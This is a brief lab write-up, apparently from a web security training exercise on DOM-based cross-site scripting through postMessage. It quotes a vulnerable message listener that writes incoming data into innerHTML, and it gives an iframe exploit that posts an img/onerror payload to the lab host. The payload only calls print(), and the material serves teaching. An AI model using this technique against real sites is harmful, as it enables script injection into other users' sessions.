## DOM XSS using web messages
We see in the webpage javascript there is the following event listener:
```
<script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
</script>
```

Staging the payload in the exploit server. 
```
<iframe src="https://0ae4003904d6f1f482f4e23200d20060.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print() >', '*')" >
```